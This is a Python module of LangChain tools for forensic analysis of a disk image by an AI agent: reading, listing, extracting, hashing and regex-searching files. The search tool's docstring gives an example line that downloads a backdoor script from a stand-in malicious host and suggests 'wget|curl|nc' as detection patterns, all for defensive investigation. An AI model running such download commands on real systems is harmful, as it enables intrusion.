"""
Image Tools - Инструменты для работы с образом диска.

Этот модуль содержит LangChain tools для:
- Открытия/закрытия образа диска
- Чтения файлов из образа
- Листинга директорий
- Извлечения файлов для детального анализа
- Получения метаданных файлов
- Поиска по содержимому файлов в образе

Все tools используют ImageManager для доступа к образу.
"""

import json
import re
from pathlib import Path
from typing import Optional, List, Dict, Any
from langchain_core.tools import tool

from .image_manager import get_image_manager
from src.utils.logger import get_logger
from src.utils.filesystem import FileSystemUtils

logger = get_logger("ImageTools")
fs_utils = FileSystemUtils()


@tool
def open_disk_image(image_path: str) -> str:
    """
    Открыть образ диска для криминалистического анализа.
    
    Это ПЕРВЫЙ инструмент, который нужно вызвать перед любым анализом образа.
    Поддерживает RAW образы разделов и полные образы дисков с таблицами разделов (MBR/GPT).
    
    ВАЖНО: После открытия образа все остальные инструменты для работы с образом
    будут использовать этот открытый образ до его закрытия или открытия другого.
    
    Args:
        image_path: Полный путь к файлу образа диска (формат RAW/dd/img).
                   Пример: "/path/to/disk.raw" или "/path/to/disk.img"
    
    Returns:
        JSON строка с результатом:
        - success: True если образ успешно открыт
        - message: Описание результата
        - image_path: Путь к открытому образу
        
    Example:
        >>> open_disk_image("/data/evidence/server.raw")
        '{"success": true, "message": "Image opened successfully", "image_path": "/data/evidence/server.raw"}'
    """
    manager = get_image_manager()
    result = manager.open_image(image_path)
    logger.info(f"open_disk_image: {result}")
    return json.dumps(result, ensure_ascii=False)


@tool
def close_disk_image() -> str:
    """
    Закрыть текущий открытый образ диска.
    
    Используйте этот инструмент когда:
    - Закончили анализ образа
    - Нужно открыть другой образ
    - Хотите освободить ресурсы
    
    Returns:
        JSON строка с результатом операции:
        - success: True если образ успешно закрыт
        - message: Описание результата
        
    Example:
        >>> close_disk_image()
        '{"success": true, "message": "Image closed successfully"}'
    """
    manager = get_image_manager()
    result = manager.close_image()
    logger.info(f"close_disk_image: {result}")
    return json.dumps(result, ensure_ascii=False)


@tool
def get_os_info() -> str:
    """
    Определить операционную систему в образе диска.
    
    Анализирует файлы /etc/os-release и /etc/issue для определения:
    - Типа ОС (ubuntu, debian, centos, и т.д.)
    - Версии ОС
    - Является ли система Linux
    
    ВАЖНО: Образ диска должен быть предварительно открыт с помощью open_disk_image().
    
    Returns:
        JSON строка с информацией об ОС:
        - os_name: Имя ОС (например, "ubuntu", "debian")
        - os_release: Полное содержимое /etc/os-release
        - issue: Содержимое /etc/issue
        - is_linux: True если это Linux система
        
    Example:
        >>> get_os_info()
        '{"os_name": "ubuntu", "is_linux": true, "os_release": "NAME=\\"Ubuntu\\"\\nVERSION=\\"22.04.1 LTS\\"..."}'
    """
    manager = get_image_manager()
    
    if not manager.is_open:
        return json.dumps({
            "error": "Image not open. Use open_disk_image() first."
        }, ensure_ascii=False)
    
    result = {
        "os_name": None,
        "os_release": None,
        "issue": None,
        "is_linux": False
    }
    
    # Читаем /etc/os-release
    os_release = manager.read_file('/etc/os-release')
    if os_release:
        result["os_release"] = os_release
        for line in os_release.split('\n'):
            if line.startswith('ID='):
                result["os_name"] = line.split('=')[1].strip().strip('"').lower()
                result["is_linux"] = True
                break
    
    # Читаем /etc/issue как fallback
    issue = manager.read_file('/etc/issue')
    if issue:
        result["issue"] = issue
        if 'linux' in issue.lower() and not result["is_linux"]:
            result["is_linux"] = True
            result["os_name"] = "linux"
    
    logger.info(f"get_os_info: detected OS = {result['os_name']}")
    return json.dumps(result, ensure_ascii=False)


@tool
def read_file_from_image(file_path: str) -> str:
    """
    Прочитать содержимое файла из образа диска.
    
    Используйте этот инструмент для:
    - Чтения конфигурационных файлов (/etc/passwd, /etc/ssh/sshd_config)
    - Чтения логов (/var/log/auth.log)
    - Чтения скриптов и исполняемых файлов
    - Чтения любых текстовых файлов для анализа
    
    ВАЖНО: Образ диска должен быть предварительно открыт с помощью open_disk_image().
    
    Args:
        file_path: Абсолютный путь к файлу внутри образа диска.
                  Пример: "/etc/passwd" или "/var/log/auth.log"
    
    Returns:
        JSON строка с результатом:
        - success: True если файл успешно прочитан
        - content: Содержимое файла (текст)
        - path: Путь к файлу
        - error: Описание ошибки (если файл не найден)
        
    Example:
        >>> read_file_from_image("/etc/passwd")
        '{"success": true, "path": "/etc/passwd", "content": "root:x:0:0:root:/root:/bin/bash\\n..."}'
    """
    manager = get_image_manager()
    
    if not manager.is_open:
        return json.dumps({
            "success": False,
            "error": "Image not open. Use open_disk_image() first.",
            "path": file_path
        }, ensure_ascii=False)
    
    content = manager.read_file(file_path)
    
    if content is not None:
        logger.debug(f"read_file_from_image: {file_path} - {len(content)} bytes")
        return json.dumps({
            "success": True,
            "path": file_path,
            "content": content,
            "size": len(content)
        }, ensure_ascii=False)
    else:
        logger.debug(f"read_file_from_image: {file_path} - not found")
        return json.dumps({
            "success": False,
            "path": file_path,
            "error": f"Could not read file: {file_path}"
        }, ensure_ascii=False)


@tool
def list_directory_in_image(dir_path: str) -> str:
    """
    Получить список файлов и директорий в указанной директории образа диска.
    
    Используйте этот инструмент для:
    - Исследования структуры файловой системы
    - Поиска подозрительных файлов и директорий
    - Обнаружения скрытых файлов
    - Анализа домашних директорий пользователей
    
    ВАЖНО: Образ диска должен быть предварительно открыт с помощью open_disk_image().
    
    Args:
        dir_path: Абсолютный путь к директории внутри образа диска.
                 Пример: "/home" или "/var/log" или "/root"
    
    Returns:
        JSON строка со списком файлов:
        - success: True если директория найдена
        - path: Путь к директории
        - count: Количество элементов
        - entries: Список файлов с информацией:
            - name: Имя файла
            - path: Полный путь
            - type: 'file' или 'directory'
            - size: Размер в байтах (для файлов)
            
    Example:
        >>> list_directory_in_image("/home")
        '{"success": true, "path": "/home", "count": 3, "entries": [{"name": "user1", "type": "directory"}, ...]}'
    """
    manager = get_image_manager()
    
    if not manager.is_open:
        return json.dumps({
            "success": False,
            "error": "Image not open. Use open_disk_image() first.",
            "path": dir_path
        }, ensure_ascii=False)
    
    entries = manager.list_directory(dir_path)
    
    logger.debug(f"list_directory_in_image: {dir_path} - {len(entries)} entries")
    return json.dumps({
        "success": True,
        "path": dir_path,
        "count": len(entries),
        "entries": entries
    }, ensure_ascii=False)


@tool
def extract_file_from_image(file_path: str, output_dir: str = "extracted") -> str:
    """
    Извлечь файл из образа диска в локальную файловую систему для детального анализа.
    
    Используйте этот инструмент когда нужно:
    - Сохранить подозрительный файл для анализа
    - Вычислить хеши файла (MD5, SHA1, SHA256)
    - Передать файл на анализ другим инструментам
    - Сохранить важный артефакт для отчёта
    
    ВАЖНО: 
    - Образ диска должен быть предварительно открыт с помощью open_disk_image()
    - Файл сохраняется в указанную директорию с безопасным именем
    
    Args:
        file_path: Абсолютный путь к файлу внутри образа диска.
                  Пример: "/home/user/.bashrc" или "/usr/local/bin/suspicious"
        output_dir: Директория для сохранения извлечённого файла.
                   По умолчанию: "extracted"
    
    Returns:
        JSON строка с результатом:
        - success: True если файл успешно извлечён
        - source_path: Исходный путь в образе
        - extracted_path: Путь к извлечённому файлу
        - size: Размер файла в байтах
        - hashes: MD5, SHA1, SHA256 хеши файла
        
    Example:
        >>> extract_file_from_image("/home/user/.bash_history", "extracted")
        '{"success": true, "source_path": "/home/user/.bash_history", "extracted_path": "extracted/home_user_.bash_history", "size": 1234, "hashes": {"md5": "abc...", "sha256": "def..."}}'
    """
    manager = get_image_manager()
    
    if not manager.is_open:
        return json.dumps({
            "success": False,
            "error": "Image not open. Use open_disk_image() first.",
            "source_path": file_path
        }, ensure_ascii=False)
    
    # Читаем файл в бинарном режиме
    content = manager.read_file_binary(file_path)
    
    if content is None:
        return json.dumps({
            "success": False,
            "error": f"Could not read file: {file_path}",
            "source_path": file_path
        }, ensure_ascii=False)
    
    # Защита от абсолютных путей (AI может передать /analysis и т.п.)
    if output_dir.startswith('/'):
        logger.warning(f"Absolute output_dir '{output_dir}' rejected, using default")
        output_dir = "extracted"
    
    # Создаём безопасное имя файла
    safe_name = file_path.replace('/', '_').lstrip('_')
    output_path = Path(output_dir) / safe_name
    
    # Создаём директорию и записываем файл
    fs_utils.ensure_directory(output_path.parent)
    
    try:
        with open(output_path, 'wb') as f:
            f.write(content)
        
        # Вычисляем хеши
        hashes = fs_utils.calculate_hashes(output_path)
        
        logger.info(f"extract_file_from_image: {file_path} -> {output_path}")
        return json.dumps({
            "success": True,
            "source_path": file_path,
            "extracted_path": str(output_path),
            "size": len(content),
            "hashes": hashes
        }, ensure_ascii=False)
        
    except Exception as e:
        logger.error(f"Error extracting file: {e}")
        return json.dumps({
            "success": False,
            "error": str(e),
            "source_path": file_path
        }, ensure_ascii=False)


@tool
def get_file_metadata_from_image(file_path: str) -> str:
    """
    Получить метаданные файла из образа диска (timestamps, размер, тип).
    
    Используйте этот инструмент для:
    - Анализа timeline (когда файл был создан/изменён)
    - Определения подозрительных временных меток
    - Построения хронологии событий
    - Выявления backdating (подделки временных меток)
    
    ВАЖНО: Образ диска должен быть предварительно открыт с помощью open_disk_image().
    
    Args:
        file_path: Абсолютный путь к файлу внутри образа диска.
                  Пример: "/etc/passwd" или "/usr/local/bin/backdoor"
    
    Returns:
        JSON строка с метаданными:
        - success: True если метаданные получены
        - path: Путь к файлу
        - name: Имя файла
        - size: Размер в байтах
        - type: 'file' или 'directory'
        - created: Время создания (Unix timestamp)
        - modified: Время изменения (Unix timestamp)
        - accessed: Время последнего доступа (Unix timestamp)
        
    Example:
        >>> get_file_metadata_from_image("/etc/passwd")
        '{"success": true, "path": "/etc/passwd", "size": 2345, "type": "file", "modified": 1699574400, ...}'
    """
    manager = get_image_manager()
    
    if not manager.is_open:
        return json.dumps({
            "success": False,
            "error": "Image not open. Use open_disk_image() first.",
            "path": file_path
        }, ensure_ascii=False)
    
    info = manager.get_file_info(file_path)
    
    if info is not None:
        logger.debug(f"get_file_metadata_from_image: {file_path}")
        return json.dumps({
            "success": True,
            **info
        }, ensure_ascii=False)
    else:
        return json.dumps({
            "success": False,
            "error": f"Could not get metadata for: {file_path}",
            "path": file_path
        }, ensure_ascii=False)


@tool
def search_in_image_files(
    directory: str, 
    pattern: str, 
    file_extension: Optional[str] = None,
    max_depth: int = 5
) -> str:
    """
    Поиск по содержимому файлов в директории образа диска (grep-подобный).
    
    Ищет указанный паттерн (регулярное выражение) во всех файлах
    указанной директории внутри образа и возвращает совпадения с контекстом.
    
    Используйте этот инструмент для:
    - Поиска подозрительных строк в логах образа
    - Нахождения IP-адресов, доменов, команд в файлах образа
    - Выявления паттернов атак в конфигах и скриптах
    - Поиска backdoor-ов и вредоносных команд
    - Поиска упоминаний определённых пользователей или хостов
    
    ВАЖНО: 
    - Образ диска должен быть предварительно открыт с помощью open_disk_image()
    - Поддерживает регулярные выражения (Python re)
    - Ограничивает количество результатов для производительности
    - Глубина рекурсии ограничена для предотвращения зависаний
    
    Args:
        directory: Директория для поиска в образе.
                  Пример: "/var/log" или "/home" или "/etc"
        pattern: Регулярное выражение для поиска.
                Пример: "192\\.168\\.1\\." или "wget|curl|nc"
                Пример: "Failed password" или "root@"
        file_extension: Опциональное расширение файлов для фильтрации.
                       Пример: ".log" или ".conf" или ".sh"
        max_depth: Максимальная глубина рекурсии (по умолчанию 5).
                  Используйте меньшие значения для больших директорий.
    
    Returns:
        JSON строка с результатами:
        - success: True если поиск выполнен
        - pattern: Искомый паттерн
        - directory: Директория поиска
        - matches: Список совпадений:
            - file: Путь к файлу в образе
            - line_number: Номер строки
            - line: Содержимое строки (до 500 символов)
            - match: Найденное совпадение
        - total_matches: Общее количество совпадений
        - files_searched: Количество проверенных файлов
        - truncated: True если результаты обрезаны
        
    Example:
        >>> search_in_image_files("/var/log", "Failed password", ".log")
        '{"success": true, "total_matches": 15, "matches": [{"file": "/var/log/auth.log", "line_number": 123, "line": "Jan 15 Failed password for root from 192.168.1.100", ...}]}'
        
        >>> search_in_image_files("/home", "wget|curl|nc\\s")
        '{"success": true, "total_matches": 3, "matches": [{"file": "/home/user/.bash_history", "line": "wget http://malicious.com/backdoor.sh", ...}]}'
    """
    manager = get_image_manager()
    
    if not manager.is_open:
        return json.dumps({
            "success": False,
            "error": "Image not open. Use open_disk_image() first.",
            "directory": directory
        }, ensure_ascii=False)
    
    # Компилируем regex
    try:
        regex = re.compile(pattern, re.IGNORECASE)
    except re.error as e:
        return json.dumps({
            "success": False,
            "error": f"Invalid regex pattern: {str(e)}",
            "pattern": pattern
        }, ensure_ascii=False)
    
    matches = []
    files_searched = 0
    files_skipped = 0
    max_matches = 100  # Ограничение для производительности
    max_file_size = 10 * 1024 * 1024  # 10MB - максимальный размер файла для поиска
    
    # Внутренняя функция для рекурсивного обхода
    def search_recursive(current_dir: str, current_depth: int):
        nonlocal files_searched, files_skipped
        
        if current_depth > max_depth:
            return
        
        if len(matches) >= max_matches:
            return
        
        entries = manager.list_directory(current_dir)
        
        for entry in entries:
            if len(matches) >= max_matches:
                return
            
            entry_path = entry.get('path', '')
            entry_type = entry.get('type', '')
            entry_name = entry.get('name', '')
            entry_size = entry.get('size', 0)
            
            # Пропускаем скрытые системные директории для производительности
            if entry_name in ['.', '..', 'proc', 'sys', 'dev']:
                continue
            
            if entry_type == 'directory':
                # Рекурсивный обход поддиректорий
                search_recursive(entry_path, current_depth + 1)
            
            elif entry_type == 'file':
                # Фильтр по расширению
                if file_extension:
                    if not entry_name.endswith(file_extension):
                        continue
                
                # Пропускаем слишком большие файлы
                if entry_size and entry_size > max_file_size:
                    files_skipped += 1
                    continue
                
                # Пропускаем бинарные расширения
                binary_extensions = ['.bin', '.exe', '.so', '.o', '.a', '.gz', '.zip', 
                                    '.tar', '.jpg', '.jpeg', '.png', '.gif', '.pdf',
                                    '.db', '.sqlite', '.pyc', '.class']
                if any(entry_name.endswith(ext) for ext in binary_extensions):
                    files_skipped += 1
                    continue
                
                # Читаем содержимое файла
                content = manager.read_file(entry_path)
                
                if content is None:
                    files_skipped += 1
                    continue
                
                files_searched += 1
                
                # Ищем паттерн в файле
                for line_num, line in enumerate(content.split('\n'), 1):
                    match = regex.search(line)
                    if match:
                        matches.append({
                            "file": entry_path,
                            "line_number": line_num,
                            "line": line[:500],  # Ограничиваем длину строки
                            "match": match.group()
                        })
                        
                        if len(matches) >= max_matches:
                            return
    
    try:
        # Проверяем что директория существует
        entries = manager.list_directory(directory)
        if not entries and directory != '/':
            # Возможно это файл, а не директория
            return json.dumps({
                "success": False,
                "error": f"Directory not found or empty: {directory}",
                "directory": directory
            }, ensure_ascii=False)
        
        # Запускаем рекурсивный поиск
        search_recursive(directory, 0)
        
        result = {
            "success": True,
            "pattern": pattern,
            "directory": directory,
            "total_matches": len(matches),
            "files_searched": files_searched,
            "files_skipped": files_skipped,
            "matches": matches,
            "truncated": len(matches) >= max_matches,
            "max_depth": max_depth
        }
        
        if file_extension:
            result["file_extension_filter"] = file_extension
        
        logger.info(f"search_in_image_files: found {len(matches)} matches in {files_searched} files (directory: {directory}, pattern: {pattern})")
        return json.dumps(result, ensure_ascii=False)
        
    except Exception as e:
        logger.error(f"Error searching in image files: {e}")
        return json.dumps({
            "success": False,
            "error": str(e),
            "directory": directory,
            "pattern": pattern
        }, ensure_ascii=False)
